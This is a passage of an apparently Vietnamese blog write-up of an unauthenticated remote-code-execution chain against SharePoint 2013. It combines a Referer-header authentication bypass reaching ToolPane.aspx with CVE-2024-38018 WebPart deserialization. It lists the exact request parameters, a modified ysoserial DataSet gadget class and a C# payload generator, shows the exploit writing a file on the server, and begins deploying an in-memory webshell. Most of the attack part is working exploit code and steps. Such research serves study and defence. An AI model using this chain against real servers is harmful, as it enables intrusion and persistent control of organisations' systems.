+</span></span><span class=line><span class=cl>       SPUtility.SendAccessDeniedHeader(new UnauthorizedAccessException());
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>Logic code sẽ cho phép người dùng unauthen vẫn có thể truy cập các file script js và stylesheet css để phục vụ việc hiển thị. Các trường hợp còn lại sẽ kiểm tra nhằm trả về status 401 về cho người dùng. Có 3 nhánh if else, nếu như làm cho false cả 3 thì người dùng không xác thực có thể bypass đoạn check này và tiếp tục được xử lý yêu cầu. Để làm được điều đó thì cần flag6 là true, còn flag4 và flag5 cần có giá trị false.<br>Xem xét đoạn code đằng trước, ta thấy được nếu như flag4 mang giá trị false thì chương trình sẽ nhảy vào nhánh if(flag5) vì flag5 = !flag4 = true:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=ne>bool</span> <span class=n>flag4</span> <span class=o>=</span> <span class=n>SPSecurity</span><span class=o>.</span><span class=n>AuthenticationMode</span> <span class=o>==</span> <span class=n>AuthenticationMode</span><span class=o>.</span><span class=n>Forms</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>flag2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=ne>bool</span> <span class=n>flag5</span> <span class=o>=</span> <span class=o>!</span><span class=n>flag4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=n>ULS</span><span class=o>.</span><span class=n>SendTraceTag</span><span class=p>(</span><span class=mi>2373643</span><span class=n>U</span><span class=p>,</span> <span class=n>ULSCat</span><span class=o>.</span><span class=n>msoulscat_WSS_Runtime</span><span class=p>,</span> <span class=n>ULSTraceLevel</span><span class=o>.</span><span class=n>Verbose</span><span class=p>,</span> <span class=s2>&#34;Value for checkAuthenticationCookie is : {0}&#34;</span><span class=p>,</span> <span class=n>new</span> <span class=n>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>flag5</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl><span class=ne>bool</span> <span class=n>flag6</span> <span class=o>=</span> <span class=bp>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=n>string</span> <span class=n>text2</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>FilePath</span><span class=o>.</span><span class=n>ToLowerInvariant</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>flag5</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=n>Uri</span> <span class=n>uri2</span> <span class=o>=</span> <span class=n>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>try</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>uri2</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>UrlReferrer</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>catch</span> <span class=p>(</span><span class=n>UriFormatException</span><span class=p>){}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>IsShareByLinkPage</span><span class=p>(</span><span class=n>context</span><span class=p>)</span> <span class=o>||</span> <span class=n>this</span><span class=o>.</span><span class=n>IsAnonymousVtiBinPage</span><span class=p>(</span><span class=n>context</span><span class=p>)</span> <span class=o>||</span> <span class=n>this</span><span class=o>.</span><span class=n>IsAnonymousDynamicRequest</span><span class=p>(</span><span class=n>context</span><span class=p>)</span> <span class=o>||</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Path</span><span class=o>.</span><span class=n>StartsWith</span><span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>signoutPathRoot</span><span class=p>)</span> <span class=o>||</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Path</span><span class=o>.</span><span class=n>StartsWith</span><span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>signoutPathPrevious</span><span class=p>)</span> <span class=o>||</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Path</span><span class=o>.</span><span class=n>StartsWith</span><span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>signoutPathCurrent</span><span class=p>)</span> <span class=o>||</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Path</span><span class=o>.</span><span class=n>StartsWith</span><span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>startPathRoot</span><span class=p>)</span> <span class=o>||</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Path</span><span class=o>.</span><span class=n>StartsWith</span><span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>startPathPrevious</span><span class=p>)</span> <span class=o>||</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Path</span><span class=o>.</span><span class=n>StartsWith</span><span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>startPathCurrent</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=n>uri2</span> <span class=o>!=</span> <span class=n>null</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>SPUtility</span><span class=o>.</span><span class=n>StsCompareStrings</span><span class=p>(</span><span class=n>uri2</span><span class=o>.</span><span class=n>AbsolutePath</span><span class=p>,</span> <span class=n>this</span><span class=o>.</span><span class=n>signoutPathRoot</span><span class=p>)</span> <span class=o>||</span> <span class=n>SPUtility</span><span class=o>.</span><span class=n>StsCompareStrings</span><span class=p>(</span><span class=n>uri2</span><span class=o>.</span><span class=n>AbsolutePath</span><span class=p>,</span> <span class=n>this</span><span class=o>.</span><span class=n>signoutPathPrevious</span><span class=p>)</span> <span class=o>||</span> <span class=n>SPUtility</span><span class=o>.</span><span class=n>StsCompareStrings</span><span class=p>(</span><span class=n>uri2</span><span class=o>.</span><span class=n>AbsolutePath</span><span class=p>,</span> <span class=n>this</span><span class=o>.</span><span class=n>signoutPathCurrent</span><span class=p>)))){</span>
+</span></span><span class=line><span class=cl>       <span class=n>flag5</span> <span class=o>=</span> <span class=bp>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>       <span class=n>flag6</span> <span class=o>=</span> <span class=bp>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Trong nhánh if(flag5), server lấy ra giá trị của header Referer và so sánh giá trị của của nó với giá trị signoutPathRoot, signoutPathPrevious và signoutPathCurrent. Chỉ cần một trong các điều kiện trên đúng thì chương trình sẽ set giá trị flag5 là false và flag6 là true, đúng với ý định ban đầu. Các giá trị signoutPath mang giá trị như sau:<br><img src=https://hackmd.io/_uploads/B1F-K9yrbx.png loading=lazy alt=image><br>Hàm GetLayoutsFolder trả về giá trị <code>_layouts/15</code> hoặc <code>_layouts</code>:<br><img src=https://hackmd.io/_uploads/rkcfYcyrZe.png loading=lazy alt=image><br>Mặc định thì flag4 sẽ có giá trị false, nên để bypass cơ chế xác thực này, giá trị của header Referer sẽ là <code>/_layouts/SignOut.aspx</code> hoặc <code>/_layouts/15/SignOut.aspx</code>:<br><img src=https://hackmd.io/_uploads/BJ_VK5yH-e.png loading=lazy alt=image><br>PoC req gọi không xác thực:<br><img src=https://hackmd.io/_uploads/HJCBY5yBbe.png loading=lazy alt=image><br>Req bypass auth:<br><img src=https://hackmd.io/_uploads/Skq8t9kBZg.png loading=lazy alt=image><br>Tiếp tục đi đến nơi trigger lỗ hổng trong PoC là file ToolPane.aspx, bản thân file không có gì đặc biệt mà chỉ có đoạn khai báo code control nằm tại class Microsoft.SharePoint.WebPartPages.ToolPane:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;%@ Register TagPrefix=&#34;WebPartPages&#34; Namespace=&#34;Microsoft.SharePoint.WebPartPages&#34;%&gt;
+</span></span><span class=line><span class=cl>&lt;WebPartPages:ToolPane runat=&#34;server&#34;/&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Tại đây, Method OnInit được gọi đầu tiên để khởi tạo page, đồng thời gọi đến CheckForCustomToolpane để kiểm tra đường dẫn có phải để tạo ToolPane không:<br><img src=https://hackmd.io/_uploads/BkQNqc1rZl.png loading=lazy alt=image><br>Hàm CheckForCustomToolpane kiểm tra đường dẫn URL xem có chứa <code>/_layouts/</code> và kết thúc bằng <code>/ToolPane.aspx</code> hay không, nếu có sẽ trả về true:<br><img src=https://hackmd.io/_uploads/BywB9qkSWg.png loading=lazy alt=image><br>Tiếp theo, chương trình sẽ xử lý đến hàm SelectedAspWebPart, nơi mà nội dung WebPart truyền trong body sẽ được xử lý thông qua 2 giá trị tại body là MSOTlPn_Uri và MSOTlPn_DWP:<br><img src=https://hackmd.io/_uploads/SyHLq51Hbx.png loading=lazy alt=image><br>MSOTlPn_Uri chứa đường dẫn frontPage, còn MSOTlPn_DWP chứa nội dung thông tin về Web Part để tiến hành import, logic import sẽ nằm tại hàm GetPartPreviewAndPropertiesFromMarkup. Để vào được câu lệnh if thì còn điều kiện DisplayMode = EditDisplayMode, hay <code>?DisplayMode=Edit</code>.<br>Nhảy vào GetPartPreviewAndPropertiesFromMarkup - hàm xử lý trực tiếp import webpart là GetMarkupProperties, cũng là sink vuln deserialize bằng webpart. Nhưng trước khi đến được hàm đó cần phải thỏa mãn tất cả những dòng lệnh trên, trong đó có CreateAndInitializeDocumentDesigner, với input pageUri chính là param MSOTlPn_Uri đã truyền vào trước đó:<br><img src=https://hackmd.io/_uploads/B111j5yrWe.png loading=lazy alt=image><br>CreateAndInitializeDocumentDesigner sẽ gọi đến method Create của class ServerWebFileFromFileSystem với callstack:<br><img src=https://hackmd.io/_uploads/B1HeoqkS-g.png loading=lazy alt=image><br>Tại method này, chương trình tiến hành kiểm tra url truyền vào có chứa <code>_controltemplates/</code> và có phải file .ascx không, nếu tồn tại thì trả về object ServerWebFile dựa trên file thật, không sẽ trả về null:<br><img src=https://hackmd.io/_uploads/rJUWoc1B-l.png loading=lazy alt=image><br>Nhằm thỏa mãn dòng lệnh trên, cần tìm file ascx tùy ý nằm trong folder <code>_controltemplates/</code>, mình lựa chọn <code>_controltemplates/15/ActionBar.ascx</code> để poc vì nó ở ngay đầu.<br>Cũng có hơi nhiều điều kiện rồi, tổng hợp lại để bypass authen vào được endpoint ToolPane.aspx, mình cần:</p><ul><li>Referer header: <code>/_layouts/15/SignOut.aspx</code></li><li>URL param: <code>DisplayMode=Edit</code></li><li>URL phải kết thúc bằng /ToolPane.aspx: thêm một url param tùy ý với giá trị là /ToolPane.aspx</li><li>MSOTlPn_Uri: <code>http://sp-server/my/_controltemplates/15/ActionBar.ascx</code></li></ul><h3 id=cve-2024-38018-webpart-properties-insecure-deserialize>[CVE-2024-38018] WebPart Properties Insecure Deserialize</h3><p>Khúc này sẽ hơi cấn vì tại sao mình lại không dùng CVE-2025-49704 mà lại là một CVE khác. Khi tiến hành thử poc để test thì mình confirm đã bypass auth nhưng lại không thể trigger deser, nó sẽ văng ra lỗi file Web Part not valid, mình đoán là do cấu trúc Webpart của phiên bản 2013 và 2019 có sự khác biệt nên khi import vào bị lỗi. (Vậy mà microsoft bảo rằng exploit được ở mọi phiên bản Sharepoint 2013)<br>Mày mò cài Service Pack và cài tiếp bản patch cho Sharepoint nhưng cũng không giòn. Mình có đi hỏi và biết được người anh em xã hội cũng gặp vấn đề tương tự, và người anh em đó đã cho mình một solution khác: sử dụng CVE-2024-38018 - một CVE khác attack vào Insecure Deserialize property của webpart. PoC của lỗ hổng đã được đề cập và phân tích khá chi tiết tại <a class=link href=https://blog.viettelcybersecurity.com/sharepoint_properties_deser/ target=_blank rel=noopener>https://blog.viettelcybersecurity.com/sharepoint_properties_deser/</a> nên mình cũng khá là ăn theo thôi :)))<br>Tiếp tục phân tích nào, mình sẽ lấy phần webpart của bài phân tích trên:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;%@ Register Tagprefix=&#34;WebPartPages&#34; Namespace=&#34;Microsoft.SharePoint.WebPartPages&#34; Assembly=&#34;Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&#34; %&gt;
+</span></span><span class=line><span class=cl>&lt;WebPartPages:XmlWebPart ID=&#34;SPWebPartManager&#34; runat=&#34;Server&#34;&gt;
+</span></span><span class=line><span class=cl>    &lt;WebPart xmlns=&#34;http://schemas.microsoft.com/WebPart/v2&#34;&gt;
+</span></span><span class=line><span class=cl>&lt;AttachedPropertiesShared&gt;{SerializeData}&lt;/AttachedPropertiesShared&gt;
+</span></span><span class=line><span class=cl>    &lt;/WebPart&gt;
+</span></span><span class=line><span class=cl>&lt;/WebPartPages:XmlWebPart&gt;
+</span></span></code></pre></td></tr></table></div></div><p>CVE-2024-38018 đã khai thác lỗ hổng Insecure Deserialize dữ liệu DataSet thông qua cơ chế parse webpart control để thực thi code từ xa, bắt đầu từ method <code>WebPart.AddParsedSubObject()</code>. Method này sẽ luôn được gọi khi truyền vào một webpart control, với mục đích lấy toàn bộ chuỗi truyền vào đã loại bỏ phần register và reference assembly thông qua class LiteralControl để đưa vào method ParseXml:<br><img src=https://hackmd.io/_uploads/B1hFR5JrZe.png loading=lazy alt=image><br>ParseXml thực hiện deserialize dữ liệu truyền vào thông qua XmlSerializer. Deserialize, trả về object webPart và tiếp tục gọi đến DoPostDeserializationTasks để thực hiện một số thao tác sau lần deserialize đầu tiên:<br><img src=https://hackmd.io/_uploads/H1pq0ckBbg.png loading=lazy alt=image><br>DoPostDeserializationTasks sẽ tiếp tục call đến GetAttachedProperties, tại đây thuộc tính <code>_serializedAttachedPropertiesShared</code> được deserialize với binder SPSerializationBinder:<br><img src=https://hackmd.io/_uploads/B1aj0cyBZl.png loading=lazy alt=image><br>Trong khi đó, <code>_serializedAttachedPropertiesShared</code> có thể được set giá trị bằng element tag AttachedPropertiesShared:<br><img src=https://hackmd.io/_uploads/ByQT09yrZg.png loading=lazy alt=image><br>Binder SPSerializationBinder cho phép thực hiện deserialize với bất kì class nào thuộc SafeControls - là một thuộc tính được khai báo trong web.config của Sharepoint site, chứa danh sách các assembly, namespace và class được phép gọi đến và sử dụng trong Sharepoint:<br><img src=https://hackmd.io/_uploads/S1bCRc1rZx.png loading=lazy alt=image><br>Trong đống class này, vô tình làm sao có chứa SPThemes kế thừa class DataSet, cũng như sử dụng constructor của Dataset:<br><img src=https://hackmd.io/_uploads/H1UlJo1Sbx.png loading=lazy alt=image><br>Có DataSet là ngon luôn, mình đớp ngay gadget chain dataset được sử dụng trong ysoserial, chain này sẽ call đến method deserialize DataSet.Tables_0 bằng BinaryFormatter mà không kiểm tra binder. Ở đây sửa đoạn code DataSetGenerator thành type SPThemes là oke:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>[</span><span class=n>Serializable</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>public</span> <span class=k>class</span> <span class=n>DataSetMarshalMod</span> <span class=p>:</span> <span class=n>ISerializable</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>private</span> <span class=n>byte</span><span class=p>[]</span> <span class=n>_fakeTable</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>void</span> <span class=n>GetObjectData</span><span class=p>(</span><span class=n>SerializationInfo</span> <span class=n>info</span><span class=p>,</span> <span class=n>StreamingContext</span> <span class=n>context</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>SetType</span><span class=p>(</span><span class=nb>typeof</span><span class=p>(</span><span class=n>SPThemes</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.RemotingFormat&#34;</span><span class=p>,</span> <span class=n>SerializationFormat</span><span class=o>.</span><span class=n>Binary</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.DataSetName&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.Namespace&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.Prefix&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.CaseSensitive&#34;</span><span class=p>,</span> <span class=bp>false</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.LocaleLCID&#34;</span><span class=p>,</span> <span class=mi>1033</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.EnforceConstraints&#34;</span><span class=p>,</span> <span class=bp>false</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.ExtendedProperties&#34;</span><span class=p>,</span> <span class=n>null</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.Tables.Count&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.Tables_0&#34;</span><span class=p>,</span> <span class=n>this</span><span class=o>.</span><span class=n>_fakeTable</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>void</span> <span class=n>SetFakeTable</span><span class=p>(</span><span class=n>byte</span><span class=p>[]</span> <span class=n>bfPayload</span><span class=p>)</span> <span class=o>=&gt;</span> <span class=n>this</span><span class=o>.</span><span class=n>_fakeTable</span> <span class=o>=</span> <span class=n>bfPayload</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>DataSetMarshalMod</span><span class=p>(</span><span class=n>byte</span><span class=p>[]</span> <span class=n>bfPayload</span><span class=p>)</span> <span class=o>=&gt;</span> <span class=n>this</span><span class=o>.</span><span class=n>SetFakeTable</span><span class=p>(</span><span class=n>bfPayload</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Đoạn code xử lý thì dùng reflection để call được SPObjectStateFormatter.Serialize(), lưu ý là cần sử dụng dll của Sharepoint:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=k>static</span> <span class=n>void</span> <span class=n>Main</span><span class=p>(</span><span class=n>string</span><span class=p>[]</span> <span class=n>args</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=n>spformatter</span> <span class=o>=</span> <span class=n>Activator</span><span class=o>.</span><span class=n>CreateInstance</span><span class=p>(</span><span class=s2>&#34;Microsoft.SharePoint&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>Unwrap</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>MethodInfo</span> <span class=n>SPSerializer</span> <span class=o>=</span> <span class=n>spformatter</span><span class=o>.</span><span class=n>GetType</span><span class=p>()</span><span class=o>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s2>&#34;Serialize&#34;</span><span class=p>,</span> <span class=n>new</span> <span class=n>Type</span><span class=p>[]</span> <span class=p>{</span> <span class=nb>typeof</span><span class=p>(</span><span class=n>object</span><span class=p>)</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=n>psi</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ProcessStartInfo</span><span class=p>(</span><span class=err>@</span><span class=s2>&#34;ysoserial.exe&#34;</span><span class=p>,</span> <span class=err>@</span><span class=s2>&#34;-g TypeConfuseDelegate -f BinaryFormatter -o base64 -c &#34;&#34;echo SUCCESS &gt; C:\Users\Public\pwn.txt&#34;&#34;&#34;</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>       <span class=n>RedirectStandardOutput</span> <span class=o>=</span> <span class=bp>true</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>       <span class=n>UseShellExecute</span> <span class=o>=</span> <span class=bp>false</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>       <span class=n>CreateNoWindow</span> <span class=o>=</span> <span class=bp>true</span>
+</span></span><span class=line><span class=cl>    <span class=p>};</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=n>p</span> <span class=o>=</span> <span class=n>Process</span><span class=o>.</span><span class=n>Start</span><span class=p>(</span><span class=n>psi</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>string</span> <span class=n>payload</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>StandardOutput</span><span class=o>.</span><span class=n>ReadToEnd</span><span class=p>()</span><span class=o>.</span><span class=n>Trim</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>WaitForExit</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>byte</span><span class=p>[]</span> <span class=n>bytes</span> <span class=o>=</span> <span class=n>Convert</span><span class=o>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>payload</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>DataSetMarshalMod</span> <span class=n>marshal</span> <span class=o>=</span> <span class=n>new</span> <span class=n>DataSetMarshalMod</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>ArrayList</span> <span class=n>myAl</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ArrayList</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>myAl</span><span class=o>.</span><span class=n>Add</span><span class=p>(</span><span class=n>marshal</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>object</span><span class=p>[]</span> <span class=n>parametersArray</span> <span class=o>=</span> <span class=n>new</span> <span class=n>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>myAl</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>    <span class=n>string</span> <span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=n>string</span><span class=p>)</span><span class=n>SPSerializer</span><span class=o>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>spformatter</span><span class=p>,</span> <span class=n>parametersArray</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>Console</span><span class=o>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>result</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Tổng hợp lại, request khai thác cuối cùng sẽ như này:<br><img src=https://hackmd.io/_uploads/r1kvMokSWe.png loading=lazy alt=image><br>Mặc dù trả về 401 nhưng chức năng này đã được thực thi (Sharepoint có nhiều đoạn return 401 quá và mình cũng lười trace). Mở máy chạy sharepoint lên là ta thấy ngay file pwn.txt:<br><img src=https://hackmd.io/_uploads/ryaKMj1S-l.png loading=lazy alt=image><br></p><h2 id=iii-deploy-memory-webshell>III. Deploy Memory Webshell</h2><p>Mình chọn route memory webshell để inject vì nó có thể inject vào cả WebMVC và WebForms, cũng như khá dễ code. Để hiểu rõ hơn về Route Memory Webshell hoạt động như thế nào thì có thể ngó qua <a class=link href=https://kev1n1203.github.io/p/memshell-dotnet target=_blank rel=noopener>Memshell in dotnet</a> của mình.<br>Tại đây mình dùng gadgetchain ActivitySurrogateSelector để load code C#, gadgetchain này trong tool yso mặc định sẽ lấy binary từ file E.cs để load nhưng mình test thì thấy khá nhấp nháy nên mình đã chọn compile file này thành dll rồi load (works everytime).<br>Vì chain này nếu như với ver dotNet > 4.7 thì cần phải disable type check, nên mình đi check ver dotnet của Sharepoint:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PS C:\Users\sp_farmadmin&gt; Set-Location &#39;HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Client&#39;
+</span></span><span class=line><span class=cl>PS HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Client&gt; Get-ItemProperty -Path . | Select-Object Version
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Version
+</span></span><span class=line><span class=cl>-------
+</span></span><span class=line><span class=cl>4.5.51641
+</span></span></code></pre></td></tr></table></div></div><p>Ngon luôn, thử test deser load C# code trước nào.<br>File E.cs mình sửa tí từ file mặc định thôi:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>class E {
+</span></span><span class=line><span class=cl>    public E(){
+</span></span><span class=line><span class=cl>        HttpContext.Current.Response.AddHeader(&#34;kev1n-header-custom&#34;, &#34;muhehehehe&#34;);
+</span></span><span class=line><span class=cl>        HttpContext.Current.Response.Cookies.Add(new HttpCookie(&#34;skibidi&#34;, &#34;dopdopyesyes&#34;));
+</span></span><span class=line><span class=cl>        HttpContext.Current.Response.End();
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>Sửa lại script exploit phần call như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
